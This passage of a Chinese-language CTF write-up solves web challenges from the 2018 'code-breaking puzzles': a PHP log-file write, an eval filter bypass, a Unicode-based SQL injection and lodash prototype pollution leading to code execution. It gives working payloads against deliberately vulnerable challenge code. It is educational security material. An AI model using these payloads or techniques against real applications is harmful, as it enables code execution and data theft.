class="string">'php4'</span>, <span class="string">'php5'</span>, <span class="string">'phtml'</span>, <span class="string">'pht'</span>], <span class="keyword">true</span>)) &#123;</span></span><br><span class="line"><span class="php">        file_put_contents($log_name, $output);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> $output;</span></span><br><span class="line"><span class="php"><span class="keyword">endif</span>; <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>稍微阅读一下代码不难发现问题有几个核心点<br>1、没办法完全控制dig的返回，由于没办法命令注入，所以这里只能执行dig命令，唯一能控制的就是dig的目标，而且返回在显示之前还转义了尖括号，所以</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">;</span> <span class="string">&lt;&lt;&gt;&gt;</span> <span class="string">DiG</span> <span class="number">9.9</span><span class="number">.5</span><span class="number">-9</span><span class="string">+deb8u15-Debian</span> <span class="string">&lt;&lt;&gt;&gt;</span> <span class="string">-t</span> <span class="string">A</span> <span class="string">-q</span> <span class="number">1232321321</span></span><br><span class="line"><span class="string">;;</span> <span class="attr">global options:</span> <span class="string">+cmd</span></span><br><span class="line"><span class="string">;;</span> <span class="attr">Got answer:</span></span><br><span class="line"><span class="string">;;</span> <span class="string">-&gt;&gt;HEADER&lt;&lt;-</span> <span class="attr">opcode:</span> <span class="string">QUERY,</span> <span class="attr">status:</span> <span class="string">NXDOMAIN,</span> <span class="attr">id:</span> <span class="number">43507</span></span><br><span class="line"><span class="string">;;</span> <span class="attr">flags:</span> <span class="string">qr</span> <span class="string">rd</span> <span class="string">ra;</span> <span class="attr">QUERY:</span> <span class="number">1</span><span class="string">,</span> <span class="attr">ANSWER:</span> <span class="number">0</span><span class="string">,</span> <span class="attr">AUTHORITY:</span> <span class="number">1</span><span class="string">,</span> <span class="attr">ADDITIONAL:</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="string">;;</span> <span class="attr">QUESTION SECTION:</span></span><br><span class="line"><span class="string">;1232321321.</span>			<span class="string">IN</span>	<span class="string">A</span></span><br><span class="line"></span><br><span class="line"><span class="string">;;</span> <span class="attr">AUTHORITY SECTION:</span></span><br><span class="line"><span class="string">.</span>			<span class="number">10800</span>	<span class="string">IN</span>	<span class="string">SOA</span>	<span class="string">a.root-servers.net.</span> <span class="string">nstld.verisign-grs.com.</span> <span class="number">2018112800</span> <span class="number">1800</span> <span class="number">900</span> <span class="number">604800</span> <span class="number">86400</span></span><br><span class="line"></span><br><span class="line"><span class="string">;;</span> <span class="attr">Query time:</span> <span class="number">449</span> <span class="string">msec</span></span><br><span class="line"><span class="string">;;</span> <span class="attr">SERVER:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.11</span><span class="comment">#53(127.0.0.11)</span></span><br><span class="line"><span class="string">;;</span> <span class="attr">WHEN:</span> <span class="string">Wed</span> <span class="string">Nov</span> <span class="number">28</span> <span class="number">08</span><span class="string">:26:15</span> <span class="string">UTC</span> <span class="number">2018</span></span><br><span class="line"><span class="string">;;</span> <span class="attr">MSG SIZE  rcvd:</span> <span class="number">103</span></span><br></pre></td></tr></table></figure>
+
+<p>2、<code>in_array(pathinfo($log_name, PATHINFO_EXTENSION), [&#39;php&#39;, &#39;php3&#39;, &#39;php4&#39;, &#39;php5&#39;, &#39;phtml&#39;, &#39;pht&#39;], true)</code>这句过滤真的很严格，实在的讲没有什么直白的绕过办法。</p>
+<p>3、log前面会加上<code>$_SERVER[&#39;SERVER_NAME&#39;]</code></p>
+<p>第一点真的是想不到，是看了别人的wp才想明白这个关键点<br><a href="http://f1sh.site/2018/11/25/code-breaking-puzzles%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/" target="_blank" rel="noopener">http://f1sh.site/2018/11/25/code-breaking-puzzles%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/</a></p>
+<p>之前做题的时候曾经遇到过类似的问题，可以通过解base64来隐藏自己要写入的内容绕过过滤，然后php在解析的时候会忽略各种乱码，只会从<code>&lt;?php</code>开始，所以其他的乱码都不会影响到内容，唯一要注意的就是base64是4位一解的，主要不要把第一位打乱掉。</p>
+<p>简单测试一下</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">$output</span> <span class="string">=</span> <span class="string">&lt;&lt;&lt;EOT</span></span><br><span class="line"><span class="string">;</span> <span class="string">&lt;&lt;&gt;&gt;</span> <span class="string">DiG</span> <span class="number">9.9</span><span class="number">.5</span><span class="number">-9</span><span class="string">+deb8u15-Debian</span> <span class="string">&lt;&lt;&gt;&gt;</span> <span class="string">-t</span> <span class="string">A</span> <span class="string">-q</span> <span class="string">"$domain"</span></span><br><span class="line"><span class="string">;;</span> <span class="attr">global options:</span> <span class="string">+cmd</span></span><br><span class="line"><span class="string">;;</span> <span class="attr">Got answer:</span></span><br><span class="line"><span class="string">;;</span> <span class="string">-&gt;&gt;HEADER&lt;&lt;-</span> <span class="attr">opcode:</span> <span class="string">QUERY,</span> <span class="attr">status:</span> <span class="string">NXDOMAIN,</span> <span class="attr">id:</span> <span class="number">43507</span></span><br><span class="line"><span class="string">;;</span> <span class="attr">flags:</span> <span class="string">qr</span> <span class="string">rd</span> <span class="string">ra;</span> <span class="attr">QUERY:</span> <span class="number">1</span><span class="string">,</span> <span class="attr">ANSWER:</span> <span class="number">0</span><span class="string">,</span> <span class="attr">AUTHORITY:</span> <span class="number">1</span><span class="string">,</span> <span class="attr">ADDITIONAL:</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="string">;;</span> <span class="attr">QUESTION SECTION:</span></span><br><span class="line"><span class="string">;1232321321.</span>            <span class="string">IN</span>  <span class="string">A</span></span><br><span class="line"></span><br><span class="line"><span class="string">;;</span> <span class="attr">AUTHORITY SECTION:</span></span><br><span class="line"><span class="string">.</span>           <span class="number">10800</span>   <span class="string">IN</span>  <span class="string">SOA</span> <span class="string">a.root-servers.net.</span> <span class="string">nstld.verisign-grs.com.</span> <span class="number">2018112800</span> <span class="number">1800</span> <span class="number">900</span> <span class="number">604800</span> <span class="number">86400</span></span><br><span class="line"></span><br><span class="line"><span class="string">;;</span> <span class="attr">Query time:</span> <span class="number">449</span> <span class="string">msec</span></span><br><span class="line"><span class="string">;;</span> <span class="attr">SERVER:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.11</span><span class="comment">#53(127.0.0.11)</span></span><br><span class="line"><span class="string">;;</span> <span class="attr">WHEN:</span> <span class="string">Wed</span> <span class="string">Nov</span> <span class="number">28</span> <span class="number">08</span><span class="string">:26:15</span> <span class="string">UTC</span> <span class="number">2018</span></span><br><span class="line"><span class="string">;;</span> <span class="attr">MSG SIZE  rcvd:</span> <span class="number">103</span></span><br><span class="line"></span><br><span class="line"><span class="string">EOT;</span></span><br><span class="line"></span><br><span class="line"><span class="string">$output</span> <span class="string">=</span> <span class="string">htmlspecialchars($output,</span> <span class="string">ENT_HTML401</span> <span class="string">|</span> <span class="string">ENT_QUOTES);</span></span><br><span class="line"><span class="string">var_dump($output);</span></span><br><span class="line"><span class="string">var_dump(base64_decode($output));</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="http://static.zybuluo.com/LoRexxar/aa3bs1plfwhlg5nm69i3wmem/image.png" alt="image.png-309.9kB"></p>
+<p>这样一来我们就能控制文件内容了，而且可以注入<code>&lt;?php</code>了</p>
+<p>接下来就是第二步，怎么才能控制logname为调用php伪协议呢？</p>
+<p>问题就在于我们如何控制<code>$_SERVER[&#39;SERVER_NAME&#39;]</code>，而这个值怎么定是不一定的，这里在这个题目中是取自了头中的host。</p>
+<p>这样一来头我们可以控制了，我们就能调用php伪协议了，那么怎么绕过后缀限制呢？</p>
+<p>这里用了之前曾经遇到过的一个技巧（老了记性不好，翻了半天也没找到是啥比赛遇到的），<strong>test.php/.就会直接调用到test.php</strong></p>
+<p>通过这个办法可以绕过根据.来分割后缀的各种限制条件，同样也适用于当前环境下。</p>
+<p>最终poc:</p>
+<p><img src="http://static.zybuluo.com/LoRexxar/v2u053p38hbpsdy3c08koj20/image.png" alt="image.png-87.2kB"></p>
+<h1 id="easy-phplimit"><a href="#easy-phplimit" class="headerlink" title="easy - phplimit"></a>easy - phplimit</h1><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[^\W]+\((?R)?\)/'</span>, <span class="string">''</span>, $_GET[<span class="string">'code'</span>])) &#123;    </span></span><br><span class="line"><span class="php">    <span class="keyword">eval</span>($_GET[<span class="string">'code'</span>]);</span></span><br><span class="line"><span class="php">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">    show_source(<span class="keyword">__FILE__</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>这个代码就简单多了，简单来说就是只能执行一个函数，但不能设置参数，这题最早出现是在RCTF2018中</p>
+<p><a href="https://lorexxar.cn/2018/05/23/rctf2018/">https://lorexxar.cn/2018/05/23/rctf2018/</a></p>
+<p>在原来的题目中是用<code>next(getallheaders())</code>绕过这个限制的。</p>
+<p>但这里getallheaders是apache中的函数，这里是nginx环境，所以目标就是找一个函数其返回的内容是可以控制的就可以了。</p>
+<p>问题就在于这种函数还不太好找，首先nginx中并没有能获取all header的函数。</p>
+<p>所以目标基本就锁定在会不会有获取cookie，或者所有变量这种函数。在看别人writeup的时候知道了<code>get_defined_vars</code>这个函数</p>
+<p><a href="http://php.net/manual/zh/function.get-defined-vars.php" target="_blank" rel="noopener">http://php.net/manual/zh/function.get-defined-vars.php</a></p>
+<p>他会打印所有已定义的变量（包括全局变量GET等）。简单翻了翻PHP的文档也没找到其他会涉及到可控变量的</p>
+<p>在原wp中有一个很厉害的操作，直接reset所有的变量。</p>
+<p><a href="http://f1sh.site/2018/11/25/code-breaking-puzzles%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/" target="_blank" rel="noopener">http://f1sh.site/2018/11/25/code-breaking-puzzles%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/</a></p>
+<p>然后只有当前get赋值，那么就只剩下get请求的变量了<br><img src="http://static.zybuluo.com/LoRexxar/c9tepy22r9k6563g29kw8pr8/image.png" alt="image.png-32.8kB"></p>
+<p>后面就简单了拼接就好了</p>
+<p><img src="http://static.zybuluo.com/LoRexxar/9ri7yi46c9cqch7tzzz1sr2u/image.png" alt="image.png-278.5kB"></p>
+<p>然后…直接列目录好像也是个不错的办法2333</p>
+<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=readfile(<span class="name">next</span>(<span class="name">array_reverse</span>(<span class="name">scandir</span>(<span class="name">dirname</span>(<span class="name">chdir</span>(<span class="name">dirname</span>(<span class="name">getcwd</span>())))))))<span class="comment">;</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="easy-nodechr"><a href="#easy-nodechr" class="headerlink" title="easy - nodechr"></a>easy - nodechr</h1><p>nodejs的一个小问题，关键代码如下</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">function safeKeyword(keyword) &#123;</span><br><span class="line">    <span class="keyword">if</span>(isString(keyword) &amp;&amp; !keyword.match(/(union|select|;|\-\-)/is)) &#123;</span><br><span class="line">        return keyword</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return undefined</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">async function login(ctx, next) &#123;</span><br><span class="line">    <span class="keyword">if</span>(ctx.method == <span class="string">'POST'</span>) &#123;</span><br><span class="line">        let username = safeKeyword(ctx.request.body[<span class="string">'username'</span>])</span><br><span class="line">        let password = safeKeyword(ctx.request.body[<span class="string">'password'</span>])</span><br><span class="line"></span><br><span class="line">        let jump = ctx.router.url(<span class="string">'login'</span>)</span><br><span class="line">        <span class="keyword">if</span> (username &amp;&amp; password) &#123;</span><br><span class="line">            let<span class="built_in"> user </span>= await ctx.db.<span class="builtin-name">get</span>(`SELECT * <span class="keyword">FROM</span> <span class="string">"users"</span> WHERE <span class="string">"username"</span> = <span class="string">'$&#123;username.toUpperCase()&#125;'</span> <span class="keyword">AND</span> <span class="string">"password"</span> = <span class="string">'$&#123;password.toUpperCase()&#125;'</span>`)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (user) &#123;</span><br><span class="line">                ctx.session.user = user</span><br><span class="line"></span><br><span class="line">                jump = ctx.router.url(<span class="string">'admin'</span>)</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ctx.status = 303</span><br><span class="line">        ctx.redirect(jump)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        await ctx.render(<span class="string">'index'</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里的注入应该是比较清楚的，直接拼接进查询语句没什么可说的。</p>
+<p>然后safekeyword过滤了<code>select union -- ;</code>这四个，下面的逻辑其实说简单的就一句</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">c</span> = `SELECT * FROM <span class="string">"users"</span> WHERE <span class="string">"username"</span> = <span class="string">'<span class="variable">$&#123;a.toUpperCase()&#125;</span>'</span> AND <span class="string">"password"</span> = <span class="string">'<span class="variable">$&#123;b.toUpperCase()&#125;</span>'</span>`</span><br></pre></td></tr></table></figure>
+
+<p>如何构造这句来查询flag，开始看到题一味着去想盲注的办法了，后来想明白一点，在注入里，没有select是不可能去别的表里拿数据的，而题目一开始很明确的表明flag在flag表中。</p>
+<p>所以问题就又回到了最初的地方，如何绕过safekeyword的限制。</p>
+<p>ph师傅曾经写过一篇文章<br><a href="https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html" target="_blank" rel="noopener">https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html</a></p>
+<p>在js中部分字符会在toLowerCase和toUpperCase处理的时候发生难以想象的变化</p>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"ı"</span>、<span class="string">"ſ"</span>这两个字符在变大写的时候会变成I和S</span><br><span class="line"><span class="string">"K"</span>这个字符在变小写的时候会变成k</span><br></pre></td></tr></table></figure>
+
+<p>用在这里刚好合适不过了。</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">username</span>=ddog</span><br><span class="line"><span class="attr">password</span>=<span class="string">' unıon ſelect 1,flag,3 where '</span><span class="number">1</span><span class="string">'='</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="hard-thejs"><a href="#hard-thejs" class="headerlink" title="hard - thejs"></a>hard - thejs</h1><p>javascript真难….</p>
+<p>关键代码以及注释如下</p>
+<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>)</span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>)</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">'body-parser'</span>)</span><br><span class="line"><span class="keyword">const</span> lodash = <span class="built_in">require</span>(<span class="string">'lodash'</span>)</span><br><span class="line"><span class="keyword">const</span> session = <span class="built_in">require</span>(<span class="string">'express-session'</span>)</span><br><span class="line"><span class="keyword">const</span> randomize = <span class="built_in">require</span>(<span class="string">'randomatic'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = express()</span><br><span class="line">app.use(bodyParser.urlencoded(&#123;extended: <span class="literal">true</span>&#125;)).use(bodyParser.json()) <span class="comment">//对post请求的请求体进行解析</span></span><br><span class="line">app.use(<span class="string">'/static'</span>, express.static(<span class="string">'static'</span>))</span><br><span class="line">app.use(session(&#123;</span><br><span class="line">    name: <span class="string">'thejs.session'</span>,</span><br><span class="line">    secret: randomize(<span class="string">'aA0'</span>, <span class="number">16</span>), <span class="comment">// 随机数</span></span><br><span class="line">    resave: <span class="literal">false</span>,</span><br><span class="line">    saveUninitialized: <span class="literal">false</span></span><br><span class="line">&#125;))</span><br><span class="line">app.engine(<span class="string">'ejs'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">filePath, options, callback</span>) </span>&#123; <span class="comment">// 模板引擎</span></span><br><span class="line">    fs.readFile(filePath, <span class="function">(<span class="params">err, content</span>) =&gt;</span> &#123;   <span class="comment">//读文件 filepath</span></span><br><span class="line">        <span class="keyword">if</span> (err) <span class="keyword">return</span> callback(<span class="keyword">new</span> <span class="built_in">Error</span>(err))</span><br><span class="line">        <span class="keyword">let</span> compiled = lodash.template(content)  <span class="comment">//模板化</span></span><br><span class="line">        <span class="keyword">let</span> rendered = compiled(&#123;...options&#125;)   <span class="comment">//动态引入变量</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> callback(<span class="literal">null</span>, rendered)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line">app.set(<span class="string">'views'</span>, <span class="string">'./views'</span>)</span><br><span class="line">app.set(<span class="string">'view engine'</span>, <span class="string">'ejs'</span>)</span><br><span class="line"></span><br><span class="line">app.all(<span class="string">'/'</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> data = req.session.data || &#123;language: [], category: []&#125;</span><br><span class="line">    <span class="keyword">if</span> (req.method == <span class="string">'POST'</span>) &#123;</span><br><span class="line">        data = lodash.merge(data, req.body) <span class="comment">// merge 合并字典</span></span><br><span class="line">        req.session.data = data</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    res.render(<span class="string">'index'</span>, &#123;</span><br><span class="line">        language: data.language, </span><br><span class="line">        category: data.category</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">3000</span>, <span class="function"><span class="params">()</span> =&gt;</span> <span class="built_in">console</span>.log(<span class="string">`Example app listening on port 3000!`</span>))</span><br></pre></td></tr></table></figure>
+
+<p>由于对node不熟，初看代码的时候简单研究了一下各个部分都是干嘛的。然后就发现整个站几乎没什么功能，就是获取输入然后取其中固定的输出，起码就自己写的代码来说不可能有问题。</p>
+<p>再三思考下觉得可能问题在引入的包中…比较明显的就是<code>lodash.merge</code>这句，这句代码在这里非常刻意，于是就顺着这个思路去想，简单翻了一下代码发现没什么收获。后来@spine给了我一个链接</p>
+<p><a href="https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf" target="_blank" rel="noopener">https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf</a></p>
+<h2 id="js特性"><a href="#js特性" class="headerlink" title="js特性"></a>js特性</h2><p>首先我们可以先回顾一下js的一部分特性。</p>
+<p>由于js非常面向对象的编程特性，js有很多神奇的操作。<br><img src="http://static.zybuluo.com/LoRexxar/c15jhqn4pixvau8ixc7n1is5/image.png" alt="image.png-14.2kB"></p>
+<p>在js中你可以用各种方式操作自己的对象。</p>
+<p>在js中，所有的对象都是从各种基础对象继承下来的，所以每个对象都有他的父类，通过prototype可以直接操作修改父类的对象。</p>
+<p><img src="http://static.zybuluo.com/LoRexxar/vq8bm8hefnnzscxpz8f7ka7d/image.png" alt="image.png-10.9kB"></p>
+<p>而且<strong>子类会继承父类的所有方法</strong>。</p>
+<p>在js中，每个对象都有两个魔术方法，一个是<code>constructor</code>另一个是<code>__proto__</code>。</p>
+<p>对于实例来说，constructor代表其构造函数，像前面说的一样，函数可以通过prototype获取其父对象</p>
+<figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myclass</span> <span class="params">()</span> <span class="comment">&#123;&#125;</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">myclass</span>.<span class="title">prototype</span>.<span class="title">myfunc</span> = <span class="title">function</span> <span class="params">()</span> <span class="comment">&#123;return 233;&#125;</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">var</span> <span class="title">inst</span> = <span class="title">new</span> <span class="title">myclass</span><span class="params">()</span>;</span></span><br><span class="line"></span><br><span class="line">inst<span class="function">.<span class="keyword">constructor</span> <span class="comment">// return function myclass</span></span></span><br><span class="line"><span class="function"><span class="title">inst</span>.<span class="title">constructor</span>.<span class="title">prototype</span> <span class="comment">// return the prototype of myclass</span></span></span><br><span class="line"><span class="function"><span class="title">inst</span>.<span class="title">constructor</span>.<span class="title">prototype</span>.<span class="title">myfunc</span><span class="params">()</span> <span class="comment">// return 233</span></span></span><br></pre></td></tr></table></figure>
+<p><img src="http://static.zybuluo.com/LoRexxar/sviykeendizwzekf4tbttbkz/image.png" alt="image.png-16.8kB"></p>
+<p>而另一个魔术方法<code>__proto__</code>就等价于<code>.constructor.prototype</code><br><img src="http://static.zybuluo.com/LoRexxar/klcd2lie0pz82a9by3fqh7ov/image.png" alt="image.png-6.6kB"></p>
+<p>由于<strong>子类会继承父类的所有方法</strong>，所以如果在当前对象中找不到该方法，就会到父类中去找，直到找不到才会爆错</p>
+<p><img src="http://static.zybuluo.com/LoRexxar/zkj2j6o7n6j2kz6kptgx57xr/image.png" alt="image.png-9.1kB"></p>
+<p>在复习了上面的特性之后，我们回到这个漏洞</p>
+<h2 id="回到漏洞"><a href="#回到漏洞" class="headerlink" title="回到漏洞"></a>回到漏洞</h2><p>在漏洞分析文中提到了这样一种方式</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/HoLyVieR/</span>prototype-pollution-nsec18<span class="regexp">/blob/m</span>aster<span class="regexp">/paper/</span>JavaScript_prototype_pollution_attack_in_NodeJS.pdf</span><br></pre></td></tr></table></figure>
+
+<p>假设对于语句</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">obj[<span class="string">a</span>][<span class="symbol">b</span>][<span class="string">c</span>] = value</span><br></pre></td></tr></table></figure>
+
+<p>如果我们控制a为constructor，b为prototype，c为某个key，我们是不是就可以为这个对象父类初始化某个值，这个值会被继承到当前对象。同理如果a为<code>__proto__</code>，b也为<code>__proto__</code>，那么我们就可以为基类<code>Object</code>定义某个值。</p>
+<p>当然这种代码不会随时都出现，所以在实际场景下，这种攻击方式会影响什么样的操作呢。</p>
+<p>首先我们需要理解的就是，我们想办法赋值的<code>__proto__</code>对象并不是真正的这个对象，如图<br><img src="http://static.zybuluo.com/LoRexxar/vz39az7wgimmauv33eukobbn/image.png" alt="image.png-28.7kB"></p>
+<p>所以想要写到真正的<code>__proto__</code>中，我们需要一层赋值，就如同原文范例代码中的那样</p>
+<p><img src="http://static.zybuluo.com/LoRexxar/vka9pxexoj8vnmxf1ilsdwwy/image.png" alt="image.png-32.8kB"></p>
+<p>通过这样的操作，我们就可以给Object基类定义一个变量名。</p>
+<p>由于<strong>子类会继承父类的所有方法</strong>，但首先需要保证子类没有定义这个变量，因为<strong>只有当前类没有定义这个变量，才会去父类寻找</strong>。</p>
+<p>在js代码中，经常能遇到这样的代码</p>
+<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">if (!obj.aaa)</span><span class="template-variable">&#123;</span></span><br><span class="line"><span class="template-variable">    ...</span></span><br><span class="line"><span class="template-variable">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>这种情况下，js会去调用obj的aaa方法，如果aaa方法undefined，那么就会跟入到obj的父类中（js不会直接报该变量未定义并终止）。</p>
+<p>这种情况下，我们通过定义obj的基类Object的aaa方法，就能操作这个变量，改变原来的代码走向。</p>
+<p>最后让我们回到题目中来。</p>
+<h2 id="回到题目"><a href="#回到题目" class="headerlink" title="回到题目"></a>回到题目</h2><p>回到题目中，这下代码的问题点很清楚了。整个代码有且只有1个输入点也就是<code>req.body</code>，这个变量刚好通过<code>lodash.merge</code>合并.</p>
+<p><img src="http://static.zybuluo.com/LoRexxar/jueyk32hl7ip4n364y6gwhpf/image.png" alt="image.png-37.2kB"></p>
+<p>这里的<code>lodash.merge</code>刚好也就是用于将两个对象合并，成功定义了<code>__proto__</code>对象的变量。</p>
+<p><img src="http://static.zybuluo.com/LoRexxar/hewv5e9mzsu34ucce367cjug/image.png" alt="image.png-23kB"></p>
+<p>我们也可以通过上面的技巧去覆盖某个值，但问题来了，我们怎么才能getshell呢？</p>
+<p>顺着这个思路，我需要在整个代码中寻找一个，在影响Object之后，且可以执行命令的地方。</p>
+<p>很幸运的是，虽然我没有特别研究明白nodejs，但我还是发现模板是动态生成的。</p>
+<p><img src="http://static.zybuluo.com/LoRexxar/3mk7jhioca1p0q8f464papay/image.png" alt="image.png-26.3kB"></p>
+<p>这里的代码是在请求后完成的（动态渲染？）</p>
+<p>跟入到template函数中，可以很清楚的看到<br><img src="http://static.zybuluo.com/LoRexxar/md4rru83wquxs62kricum5a1/image.png" alt="image.png-74.7kB"></p>
+<p>接下来就是这一大串代码中寻找一个可以影响的变量，我们的目标是找一个未定义的变量，且后面有判断调用它</p>
+<p><img src="http://static.zybuluo.com/LoRexxar/ae0fr6ms7z7esyvagwbmbx2e/image.png" alt="image.png-28.3kB"></p>
+<p>这里的sourceURL刚好符合这个条件，我们直接跟入前面的options定义处，进入函数一直跟下去，直到lodash.js的3515行。</p>
+<p><img src="http://static.zybuluo.com/LoRexxar/ps6iu6zj7j8wk4dv9mtpdiau/image.png" alt="image.png-18.4kB"></p>
+<p><img src="http://static.zybuluo.com/LoRexxar/9sth0qe2l1jmrtwbodrcrezz/image.png" alt="image.png-147.1kB"></p>
+<p>可以看到object本身没有这个方法，但仍然遍历到了，成功注入了这个变量，紧接着渲染模板就成功执行代码了。</p>
+<h2 id="完成攻击"><a href="#完成攻击" class="headerlink" title="完成攻击"></a>完成攻击</h2><p>其实发现可以注入代码之后就简单了，我朋友说他不能用child_process来执行命令，我测试了一下发现是可以的，只是不能弹shell回来不知道怎么回事。思考了一下决定直接wget外带数据出来吧。</p>
